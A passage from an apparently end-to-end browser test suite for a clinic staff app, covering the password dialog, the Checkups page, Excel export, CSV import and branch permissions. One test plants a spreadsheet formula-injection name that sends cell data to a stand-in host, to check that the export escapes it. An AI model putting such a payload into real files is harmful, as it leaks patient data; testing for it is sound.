  await pwPhone.waitForSelector('.modal h2:has-text("Change password")');
  assert.equal(await pwPhone.locator('#staff-drawer.open').count(), 0, 'the drawer closed behind the dialog');
  const box = await changeDialog(pwPhone).boundingBox();
  assert.ok(box.x >= 0 && box.x + box.width <= 390, 'the dialog fits the screen');
  await changeFill(pwPhone, 'old-pass-1', 'phone-pass-11', 'phone-pass-11');
  await changeSubmit(pwPhone);
  await pwPhone.waitForSelector('.toast:has-text("Password changed")');
  await pwPhone.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pwPhone.evaluate(() => document.activeElement?.classList.contains('menu-toggle')), 'focus is back on the menu button');
});

// ------------------------------------------------------------- change password: loading, closing, password managers, the phone drawer
const pwLate = await newPage();
const dialogRequests = [];
pwLate.on('request', (r) => { if (/\/js\/ui\/password-dialog\.js/.test(r.url())) dialogRequests.push(r.url()); });
await pwLate.route('**/js/ui/password-dialog.js', async (route) => { await new Promise((r) => setTimeout(r, 1500)); await route.continue(); }); // a slow connection
await step('the dialog code is fetched when the account menu opens, and two clicks while it loads make ONE dialog', async () => {
  await loginAs(pwLate, 'Front desk \\(Gulshan\\)');
  assert.equal(dialogRequests.length, 0, 'not fetched before the menu is used');
  await pwLate.locator('.user-menu > button').click();
  for (let i = 0; i < 20 && !dialogRequests.length; i++) await pwLate.waitForTimeout(50);
  assert.equal(dialogRequests.length, 1, 'fetched as the menu opened, before any click on the item');
  await pwLate.locator('.user-menu .menu-list button:has-text("Change password")').click();
  await pwLate.waitForTimeout(200);
  assert.equal(await pwLate.locator('.modal').count(), 0, 'still loading');
  await changeOpen(pwLate, { wait: false }); // the impatient second click
  await pwLate.waitForSelector('.modal h2:has-text("Change password")');
  await pwLate.waitForTimeout(500);
  assert.equal(await pwLate.locator('.modal').count(), 1, 'one dialog, not two stacked ones');
});
await step('the dialog gives password managers the login name, starts on the current password, and warns about other devices', async () => {
  const dialog = changeDialog(pwLate);
  const login = dialog.locator('input[autocomplete="username"]');
  assert.equal(await login.count(), 1);
  assert.equal(await login.inputValue(), 'demo.frontdesk2@example.com');
  assert.equal(await login.getAttribute('readonly'), '');
  assert.equal(await login.getAttribute('aria-hidden'), 'true');
  assert.equal(await login.getAttribute('tabindex'), '-1');
  assert.equal(await pwLate.evaluate(() => document.activeElement?.getAttribute('autocomplete')), 'current-password');
  assert.equal(await dialog.locator('form').count(), 1);
  assert.match(await dialog.innerText(), /other computers or phones, they will be logged out and need the new password/);
});
await step('while the change is being sent the dialog cannot be closed (Escape, the x, a click outside), and says it is working', async () => {
  await pwLate.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const original = state.data.changeOwnPassword.bind(state.data);
    state.data.changeOwnPassword = async (...args) => { await new Promise((r) => setTimeout(r, 1500)); return original(...args); };
  });
  await changeFill(pwLate, 'old-pass-1', 'late-pass-11', 'late-pass-11');
  await changeSubmit(pwLate);
  await pwLate.waitForSelector('.modal[aria-busy="true"]');
  assert.equal((await changeDialog(pwLate).locator('.btn-primary').innerText()).trim(), 'Changing…');
  await pwLate.keyboard.press('Escape');
  await changeDialog(pwLate).getByRole('button', { name: 'Close' }).click();
  await pwLate.mouse.click(4, 4); // the grey area outside
  await pwLate.waitForTimeout(300);
  assert.equal(await changeDialog(pwLate).count(), 1, 'still open while sending');
  await pwLate.waitForSelector('.toast:has-text("Password changed")');
  await pwLate.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await pwLate.locator('.modal').count(), 0);
});
await step('when the change fails the label is back and the dialog can be closed again', async () => {
  await changeOpen(pwLate);
  await changeFill(pwLate, 'not-the-one', 'again-pass-22', 'again-pass-22');
  await changeSubmit(pwLate);
  await changeField(pwLate, 'Current password').locator('.field-error').waitFor();
  assert.equal((await changeDialog(pwLate).locator('.btn-primary').innerText()).trim(), 'Change password');
  assert.equal(await changeDialog(pwLate).getAttribute('aria-busy'), null);
  await pwLate.keyboard.press('Escape');
  await pwLate.waitForSelector('.modal', { state: 'detached' });
});
// A phone: touch input, so the touch sizes of the stylesheet apply. The admin has the longest menu, so the drawer scrolls.
const pwTouch = await newPage({ width: 375, height: 812 }, { isMobile: true, hasTouch: true });
await step('on a phone the drawer keeps "Change password" and "Log out" on screen, well apart, and "Show the new password" is a full-size tap target', async () => {
  await loginAs(pwTouch, 'Dr. Ali Rashid');
  await pwTouch.locator('.menu-toggle').tap();
  await pwTouch.waitForSelector('#staff-drawer.open');
  const drawer = await pwTouch.locator('#staff-drawer').evaluate((el) => ({ scrolls: el.scrollHeight > el.clientHeight + 1 }));
  assert.ok(drawer.scrolls, 'the menu is longer than the screen, so this checks the sticky foot');
  const change = await pwTouch.locator('.sidebar-foot button:has-text("Change password")').boundingBox();
  const out = await pwTouch.locator('.sidebar-foot button:has-text("Log out")').boundingBox();
  assert.ok(change.y + change.height <= 812 && out.y + out.height <= 812, `both are on screen without scrolling (at ${Math.round(change.y)} and ${Math.round(out.y)} of 812)`);
  assert.ok(out.x - (change.x + change.width) >= 24, 'a slip of the finger on "Change password" does not log out');
  await shot(pwTouch, '17-drawer-sticky-foot');
  await pwTouch.locator('.sidebar-foot button:has-text("Change password")').tap();
  await pwTouch.waitForSelector('.modal h2:has-text("Change password")');
  const row = await changeDialog(pwTouch).locator('label.show-passwords').boundingBox();
  assert.ok(row.height >= 44, `the "Show the new password" row is ${Math.round(row.height)}px tall`);
  await pwTouch.keyboard.press('Escape');
  await pwTouch.waitForSelector('.modal', { state: 'detached' });
});

// ------------------------------------------------------------- the Checkups page (admin), Download Excel, the checkup list import
// (Made-up names and phones only. Each page has its own in-memory demo data: the same page is used from the import to the
// front desk check at the end, and is never reloaded.)
const pk = await newPage();
const rowsOf = (pg) => pg.locator('table.checkup-table tbody tr[data-id]');
const pagerTotal = async (pg) => Number((await pg.locator('.pager-info').innerText()).match(/of ([\d,]+)/)[1].replace(/,/g, ''));
// Branch, the months, Source and Patient file sit behind "More filters" (a closed <details> hides them from the person and from the test).
const moreFilters = async (pg) => {
  const d = pg.locator('details.checkup-more');
  if (!(await d.evaluate((el) => el.open))) await d.locator('summary').click();
};
const openCheckups = async (pg) => {
  await pg.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').click();
  await pg.locator('.topnav .menu-list a:text-is("Checkups")').click();
  await pg.waitForSelector('h1:has-text("Checkups")');
  await pg.waitForSelector('table.checkup-table tbody tr[data-id]');
};
await step('Checkups page: menu entry, 50 rows a page, Next and Previous keep focus, the paging line says "of N"', async () => {
  await loginAs(pk, 'Dr. Ali Rashid');
  await openCheckups(pk);
  assert.match(await pk.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').getAttribute('class'), /current/, 'the Aaj ki List menu stays highlighted');
  const total = await pagerTotal(pk);
  assert.ok(total > 50, `more than one page of checkups (${total})`);
  assert.equal(await rowsOf(pk).count(), 50);
  assert.equal((await pk.locator('.page-head p').innerText()).trim(), `${total.toLocaleString('en-PK')} checkup patients`, 'no leftover "(no patient file, no Mr#)"');
  assert.equal(await pk.getByRole('button', { name: 'Previous' }).getAttribute('aria-disabled'), 'true');
  await pk.getByRole('button', { name: 'Next' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes('Showing 51-'), total);
  assert.equal(await rowsOf(pk).count(), Math.min(50, total - 50));
  assert.equal(await pk.evaluate(() => document.activeElement?.textContent), 'Next', 'focus stays on the pressed button');
  assert.deepEqual((await pk.locator('table.checkup-table thead th').allInnerTexts()).slice(0, 7).map((t) => t.trim()), ['Date', 'Patient', 'Branch', 'Treatment', 'Follow-up', 'Notes', 'Source'], 'one word, Treatment, as on the Aaj ki List');
  assert.match(await pk.evaluate(() => location.hash), /page=2/);
  await pk.getByRole('button', { name: 'Previous' }).click();
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
  assert.equal(await rowsOf(pk).count(), 50);
  await shot(pk, '15-checkups-page');
});
await step('Checkups page: Tab down the table never leaves the focused control under the paging bar', async () => {
  await pk.getByLabel('Name or phone').focus();
  let covered = 0;
  let farthest = 0;
  for (let i = 0; i < 90; i += 1) {
    await pk.keyboard.press('Tab');
    const seen = await pk.evaluate(() => {
      const a = document.activeElement;
      const p = document.querySelector('.pager');
      if (!a || !p || a === document.body || p.contains(a)) return null;
      const ar = a.getBoundingClientRect();
      const pr = p.getBoundingClientRect();
      return { hidden: ar.height > 0 && ar.bottom > pr.top + 1 && ar.top < pr.bottom - 1, y: window.scrollY };
    });
    if (seen?.hidden) covered += 1;
    farthest = Math.max(farthest, seen?.y || 0);
  }
  assert.ok(farthest > 100, 'tabbing went down the page (' + farthest + 'px)');
  assert.equal(covered, 0, covered + ' Tab stops landed under the paging bar');
  await pk.evaluate(() => window.scrollTo(0, 0));
});
await step('Checkups page: the less-used filters sit behind "More filters", which opens by itself when one of them is in use', async () => {
  const more = pk.locator('details.checkup-more');
  assert.equal(await more.evaluate((el) => el.open), false, 'closed by default');
  assert.equal(await pk.locator('.checkup-filters').getByLabel('Branch').isVisible(), false);
  assert.ok(await pk.locator('.checkup-filters').getByLabel('Follow-up').isVisible(), 'Follow-up stays in sight');
  assert.ok(await pk.getByLabel('Name or phone').isVisible());
  assert.equal(await more.locator('summary').innerText(), 'More filters');
  await moreFilters(pk);
  assert.ok(await pk.locator('.checkup-filters').getByLabel('Branch').isVisible());
  await pk.goto(BASE + '#/staff/checkups?source=archive');
  await pk.waitForFunction(() => document.querySelector('details.checkup-more')?.open === true && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false');
  assert.equal(await pk.locator('details.checkup-more summary').innerText(), 'More filters (1 in use)');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction(() => document.querySelector('details.checkup-more summary')?.textContent === 'More filters');
});
await step('Checkups page: a piece of a phone number with fewer than 4 digits says why nothing is found', async () => {
  await pk.getByLabel('Name or phone').fill('555');
  await pk.locator('.empty:has-text("No checkups match these filters.")').waitFor();
  assert.match(await pk.locator('.empty').innerText(), /To search by phone, type at least 4 digits\./);
  assert.match(await pk.locator('main').innerText(), /Part of the name, or at least 4 digits of the phone\./, 'the hint is under the box all the time');
  assert.equal(await pk.getByLabel('Name or phone').getAttribute('aria-describedby'), 'checkup-search-hint');
  await pk.getByLabel('Name or phone').fill('5550');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
});
await step('Checkups page: search by name or phone, filters, and "Clear filters"', async () => {
  const total = await pagerTotal(pk);
  const first = await rowsOf(pk).first().locator('.checkup-name-text').innerText();
  await pk.getByLabel('Name or phone').fill(first);
  await pk.waitForFunction((name) => [...document.querySelectorAll('table.checkup-table tbody tr[data-id]')].every((t) => t.textContent.includes(name)) && document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0, first);
  assert.ok((await pagerTotal(pk)) < total, 'the search narrows the list');
  assert.match(await pk.evaluate(() => location.hash), /q=/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  // a phone number written another way finds the same row (0300-555 and 0300555 are the same digits)
  const phoneText = await rowsOf(pk).first().locator('.phone-link').innerText();
  const digits = phoneText.replace(/\D/g, '');
  await pk.getByLabel('Name or phone').fill(`+92 ${digits.slice(1, 4)}-${digits.slice(4)}`);
  await pk.waitForFunction((d) => [...document.querySelectorAll('table.checkup-table tbody tr[data-id] .phone-link')].some((e) => e.textContent.replace(/\D/g, '') === d), digits);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  // Follow-up filter
  await pk.locator('.checkup-filters').getByLabel('Follow-up').selectOption('Interested');
  await pk.waitForFunction((n) => !document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  const values = await pk.locator('table.checkup-table tbody select[aria-label^="Follow-up status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(values.length > 0 && values.every((v) => v === 'Interested'), 'only Interested rows');
  // Month range and Source filter
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Source').selectOption('archive');
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
  const sources = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(7)').allInnerTexts();
  assert.ok(sources.length > 0 && sources.every((t) => /^Old list/.test(t.trim())), 'only old-list rows');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('yes');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id] a.mr').length > 0);
  assert.ok((await rowsOf(pk).count()) >= 1);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
});
await step('Checkups page: a follow-up status and a note save, and are still there after leaving the page and coming back', async () => {
  const row = rowsOf(pk).first();
  const name = await row.locator('.checkup-name-text').innerText();
  const id = await row.getAttribute('data-id');
  const current = await row.locator('select[aria-label^="Follow-up status for"]').inputValue();
  const target = current === 'Scheduled' ? 'No Response' : 'Scheduled';
  await row.locator('select[aria-label^="Follow-up status for"]').selectOption(target);
  await row.locator('.saved-mark').waitFor({ state: 'visible' });
  assert.match(await row.locator('.saved-mark').innerText(), /Saved/, 'the person sees that the status is saved');
  await row.locator('input[aria-label^="Notes for"]').fill('Call back on Monday (test)');
  await pk.waitForTimeout(1200);
  assert.equal((await pk.locator('.save-state').innerText()).trim(), 'All changes saved');
  await pk.locator('.topnav a:has-text("Today")').click();
  await pk.waitForSelector('.stat');
  await openCheckups(pk);
  await pk.getByLabel('Name or phone').fill(name);
  await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"]`);
  const back = pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`);
  assert.equal(await back.locator('select[aria-label^="Follow-up status for"]').inputValue(), target);
  assert.equal(await back.locator('input[aria-label^="Notes for"]').inputValue(), 'Call back on Monday (test)');
  // the Edit dialog changes the fee and the doctor
  await back.getByRole('button', { name: /^Edit / }).click();
  const m = pk.locator('.modal');
  assert.ok(await m.getByLabel('Treatment', { exact: true }).count(), 'the Edit dialog says Treatment too');
  await m.getByLabel(/Estimated fee/).fill('12000');
  await m.getByLabel("Doctor's name").fill('Dr. Hina (sample)');
  await m.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.toast:has-text("saved")');
  await pk.waitForSelector('.modal', { state: 'detached' });
  assert.match(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).innerText(), /Dr\. Hina \(sample\)/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
await step('Checkups page: "+ Add checkup" adds an earlier day to the list', async () => {
  await pk.getByRole('button', { name: '+ Add checkup' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Name/).fill('Page Added Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550102');
  await m.getByLabel(/^Date/).fill('2026-09-01');
  await m.getByLabel('Follow-up status').selectOption('Interested');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByLabel('Name or phone').fill('Page Added Person');
  const row = rowsOf(pk).filter({ hasText: 'Page Added Person' });
  await row.waitFor();
  assert.match(await row.innerText(), /1 Sep[a-z]* 2026/);
  await pk.waitForFunction(() => document.querySelector('.page-head p')?.textContent.trim() === '1 checkup patient matches these filters');   // one match reads in the singular
  assert.equal(await row.locator('select[aria-label^="Follow-up status for"]').inputValue(), 'Interested');
  assert.match(await row.innerText(), /Website/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
await step("Checkups page: \"+ Add checkup\" flags a phone number already on that branch's list for the day, and the flag follows the date", async () => {
  await pk.getByRole('button', { name: '+ Add checkup' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Name/).fill('Page Added Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550102');
  await m.getByLabel(/^Date/).fill('2026-09-01');
  await m.getByLabel(/^Phone number/).press('Tab');
  await m.locator('.alert-warning:has-text("Already on the list for 1 Sep")').waitFor();
  await m.getByLabel(/^Date/).fill('2026-08-31');
  await pk.waitForFunction(() => !document.querySelector('.modal')?.textContent.includes('Already on the list for'));
  assert.match(await m.innerText(), /Goes on the Checkups page, and on that branch's Aaj ki List for the day you choose\./);
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Checkups page: "Register" gives a patient file and an Mr#; the row then links to the patient and offers no second Register', async () => {
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('no');
  await pk.waitForFunction(() => document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false' && document.querySelector('table.checkup-table tbody tr[data-id]') && !document.querySelector('table.checkup-table tbody a.mr'));
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  await row.getByRole('button', { name: /^Register / }).click();
  const m = pk.locator('.modal');
  await m.getByRole('button', { name: 'Create patient file' }).waitFor();
  assert.match(await m.innerText(), /This creates a patient file for .+ with the next Mr#, using this name, phone and branch[.] Use it when they start treatment[.]/);
  await m.getByRole('button', { name: 'Create patient file' }).click();
  await m.locator('.registered-mr').waitFor();
  const mr = (await m.locator('.registered-mr').innerText()).match(/Registered: Mr# (\d+)/)[1];
  assert.ok(await m.getByRole('button', { name: 'Open patient file' }).count());
  await m.locator('button.btn', { hasText: 'Close' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  // the registered person is found again by the open row id
  const link = pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`);
  if (!(await link.count())) {
    await moreFilters(pk);
    await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('yes');
    await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"] a.mr`);
  }
  assert.equal((await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`).innerText()).trim(), `Mr# ${mr}`);
  assert.equal(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).getByRole('button', { name: /^Register / }).count(), 0, 'a second Register is not offered');
  await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`).click();
  await pk.waitForSelector('h1:has-text("Mr# ' + mr + '"), main:has-text("Mr# ' + mr + '")');
});
await step('Checkups page: front desk has no "Download Excel"; the admin downloads a real workbook with the export header and every filtered row', async () => {
  await pk.route('**/xlsx.mjs', (r) => r.fulfill({
    contentType: 'text/javascript',
    body: 'export const utils = { book_new: () => ({ SheetNames: [], Sheets: {} }), aoa_to_sheet: (aoa) => ({ __aoa: aoa }), book_append_sheet: (wb, ws, name) => { wb.SheetNames.push(name); wb.Sheets[name] = ws; } };\n'
      + 'export function writeFile(wb, name) { window.__xlsx = { name, aoa: wb.Sheets[wb.SheetNames[0]].__aoa }; }\n',
  }));
  await openCheckups(pk);
  await pk.getByRole('button', { name: 'Clear filters' }).click().catch(() => {});
  const total = await pagerTotal(pk);
  await pk.getByRole('button', { name: 'Download Excel' }).click();
  await pk.waitForFunction(() => window.__xlsx);
  const x = await pk.evaluate(() => window.__xlsx);
  assert.match(x.name, /^checkups_ALL_\d{4}-\d{2}-\d{2}\.xlsx$/);
  assert.deepEqual(x.aoa[0], ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Date', 'Day status', 'Treatment details', 'Source', 'Mr#', 'Added on']);
  assert.equal(x.aoa.length - 1, total, 'one line per checkup');
  assert.ok(x.aoa.slice(1).every((r) => typeof r[2] === 'string'), 'phones are text');
  // a narrower download follows the filters and names the branch
  await pk.evaluate(() => { window.__xlsx = null; });
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Branch').selectOption({ label: 'North Nazimabad' });
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
  const nn = await pagerTotal(pk);
  await pk.getByRole('button', { name: 'Download Excel' }).click();
  await pk.waitForFunction(() => window.__xlsx);
  const y = await pk.evaluate(() => window.__xlsx);
  assert.match(y.name, /^checkups_NN_/);
  assert.equal(y.aoa.length - 1, nn);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  // the front desk of the first page has no download
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await page.getByRole('button', { name: 'Download Excel' }).count(), 0);
  assert.ok(await page.getByRole('button', { name: '+ Add checkup' }).count(), 'but they may add a checkup');
});
await step('Admin -> Import -> "5. Checkup list": a file in the owner\'s layout is previewed and imported; the same file again adds nothing', async () => {
  await pk.goto(BASE + '#/staff/admin?tab=import');
  await pk.waitForSelector('h2:text("5. Checkup list")');
  const dash = '—';
  const csv = [
    'Checkup list (sample),,,,,,,,,,', 'Made-up names for the test only,,,,,,,,,,', ',,,,,,,,,,',
    'Month,Patient Name,Phone,City,Clinic,Doctor,Treatment / Checkup For,Est. Fee (Rs),Status,Notes,Source Tab',
    'Dec 2024,Import Test Alpha,0300-5550201,Karachi,RJ Mall,Dr. Ali Rashid (sample),Scaling,,Follow-up Sent,,Sample tab A',
    '2026-03-01,Import Test Beta,0300-5550202,Lahore,Lahore Gulberg,Dr. Nida (sample),Braces consult,8000,Interested,Wants to think,Sample tab B',
    `Not recorded,Import Test Gamma,0300-5550203,${dash},${dash},${dash},${dash},,Not Contacted,,Sample tab A`,
    'Jun 2025,Import Test Delta,0300-5550204,Karachi,North Nazimabad,,Checkup,,Started,,Sample tab C', ''].join('\n');
  const section = pk.locator('section.panel:has(h2:text("5. Checkup list"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'checkups-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 4 checkups' }).waitFor();
  // The box is emptied once the file is read: a browser sends no `change` for the very same file again, and this page promises that a second drop changes nothing.
  assert.deepEqual(await section.locator('input[type=file]').evaluate((el) => [el.value, el.files.length]), ['', 0], 'ready to take the same file again');
  const text = await section.innerText();
  assert.match(text, /4\s+ready to import/);
  assert.match(text, /1\s+without a month/);
  assert.match(text, /1\s+with a fee/);
  assert.match(text, /RJ Mall\s+Gulshan \(RJ Mall\)\s+1/, 'RJ Mall goes to the Gulshan branch');
  assert.match(text, /Lahore Gulberg\s+Gulberg Lahore\s+1/);
  assert.match(text, /\(empty\)\s+No branch\s+1/);
  assert.match(text, /Follow-up Sent\s+1/);
  assert.match(text, /Not Contacted\s+1/);
  assert.match(text, /Dec 2024 to Mar 2026/);
  await shot(pk, '16-import-checkups');
  await section.getByRole('button', { name: 'Import 4 checkups' }).click();
  await section.locator('.alert-info:has-text("Checkup list:")').waitFor();
  assert.match(await section.locator('.alert-info').innerText(), /4 added, 0 updated, 0 already there/);
  assert.ok(await section.locator('a:has-text("Open the checkup list")').count());
  await section.locator('input[type=file]').setInputFiles({ name: 'checkups-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 4 checkups' }).waitFor();
  await section.getByRole('button', { name: 'Import 4 checkups' }).click();
  await section.locator('.alert-info:has-text("Checkup list:")').waitFor();
  const again = await section.locator('.alert-info').innerText();
  assert.match(again, /0 added/);
  assert.match(again, /4 already there/);
});
await step('Import: a file without the Patient Name and Phone header is refused in plain words', async () => {
  const section = pk.locator('section.panel:has(h2:text("5. Checkup list"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'wrong.csv', mimeType: 'text/csv', buffer: Buffer.from('Colour,Size\nred,big\n') });
  await section.locator('.alert-stop:has-text("No checkup list found in this file")').waitFor();
  assert.match(await section.locator('.alert-stop').innerText(), /Patient Name and Phone/);
});
await step('Admin: the Aaj ki List "All branches" shows the checkup rows with their branch, and the day downloads with a type column', async () => {
  await pk.goto(BASE + '#/staff/sheet?branch=all');
  await pk.waitForSelector('th:text("Branch"):not([hidden])');
  await pk.waitForSelector('table.sheet tbody tr.is-checkup');
  const branches = await pk.locator('table.sheet tbody tr.is-checkup td:first-child').allInnerTexts();
  assert.ok(branches.length >= 3 && branches.every((b) => b.trim().length > 2), 'every checkup row names its branch');
  assert.ok(branches.some((b) => /North Nazimabad/.test(b)) && branches.some((b) => /Gulshan/.test(b)));
  assert.equal(await pk.locator('.add-panel:not([hidden])').count(), 0, 'no add panel in All branches');
  assert.equal(await pk.locator('table.sheet thead th.branch-cell').evaluate((th) => getComputedStyle(th).color), 'rgb(255, 255, 255)', 'the Branch heading is white on the purple header row');
  const [download] = await Promise.all([pk.waitForEvent('download'), pk.getByRole('button', { name: 'Download', exact: true }).click()]);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '');
  const [head, ...lines] = csv.split('\n');
  assert.match(head, /,type$/);
  assert.ok(lines.some((l) => /,Checkup$/.test(l)) && lines.some((l) => /,Patient$/.test(l)), 'both kinds of row');
});
await step('Aaj ki List download: a checkup patient named like a formula is written as text, not as a formula', async () => {
  const evil = '=HYPERLINK("https://evil.example/?d="&K2,"Open")';
  await pk.goto(BASE + '#/staff/sheet?branch=2');
  await pk.getByRole('button', { name: '+ Checkup patient' }).waitFor();
  await pk.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Name/).fill(evil);
  await m.getByLabel(/^Phone number/).fill('0300 5550956');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.toast:has-text("added as a checkup patient")');
  const row = pk.locator('table.sheet tbody tr.is-checkup', { has: pk.locator('input[aria-label^="Name of checkup patient =HYPERLINK"]') });
  await row.waitFor();
  const [download] = await Promise.all([pk.waitForEvent('download'), pk.getByRole('button', { name: 'Download', exact: true }).click()]);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '');
  const line = csv.split('\n').find((l) => l.includes('HYPERLINK'));
  assert.ok(line, 'the checkup patient is in the file');
  assert.ok(line.includes(',"\'=HYPERLINK(""https://evil.example/?d=""&K2,""Open"")",'), 'the cell starts with an apostrophe and is quoted: ' + line.slice(0, 80));
  assert.ok(csv.split('\n').every((l) => !/(^|,)[=@]/.test(l)), 'no cell of the file starts with = or @');
  // leave the list as it was
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('Checkups page: a note typed while offline is kept on this device and saved when the connection is back', async () => {
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector('table.checkup-table tbody tr[data-id]');
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  await pk.context().setOffline(true);
  await pk.locator('.offline-banner:not([hidden])').waitFor();
  await row.locator('input[aria-label^="Notes for"]').fill('Typed offline (test)');
  await pk.waitForFunction(() => /Offline: 1 typed change/.test(document.querySelector('.save-state')?.textContent || ''));
  await pk.context().setOffline(false);
  await pk.waitForFunction(() => document.querySelector('.save-state')?.textContent.trim() === 'All changes saved');
  await pk.goto(BASE + '#/staff/today');
  await pk.waitForSelector('.stat');
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"]`);
  assert.equal(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] input[aria-label^="Notes for"]`).inputValue(), 'Typed offline (test)');
});
await step('Edit on an old-list row tells Dr. Ali (and only Dr. Ali) that importing the file again adds the old spelling a second time', async () => {
  await pk.goto(BASE + '#/staff/checkups?q=Import%20Test%20Delta');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 1);
  await rowsOf(pk).first().getByRole('button', { name: /^Edit / }).click();
  assert.match(await pk.locator('.modal').innerText(), /This row came from the old list\. If you change the name or phone, importing that file again adds this person a second time\./);
  await pk.keyboard.press('Escape');
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Front desk (North Nazimabad) on the Checkups page sees the imported North Nazimabad row and the no-branch row, never the RJ Mall or Lahore rows, and cannot remove an old-list row', async () => {
  await tryAnotherRole(pk);
  await pk.goto(BASE + '#/login/staff');
  await pk.getByRole('button', { name: /Front desk \(North Nazimabad\)/ }).click();
  await pk.waitForSelector('.topbar');
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector('table.checkup-table tbody tr[data-id]');
  await pk.getByLabel('Name or phone').fill('Import Test');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 2);
  const names = await pk.locator('table.checkup-table tbody tr[data-id] .checkup-name-text').allInnerTexts();
  assert.deepEqual(names.sort(), ['Import Test Delta', 'Import Test Gamma']);
  await pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Import Test Delta' }).getByRole('button', { name: /^Edit / }).click();
  const m = pk.locator('.modal');
  assert.doesNotMatch(await m.innerText(), /old list/i, 'the note about importing the file again is for Dr. Ali, not for the front desk');
  assert.equal(await m.getByRole('button', { name: 'Remove' }).count(), 0, 'old-list rows are removed by Dr. Ali only');
  await pk.keyboard.press('Escape');
  // a row the front desk added on the website can be removed from the Edit dialog
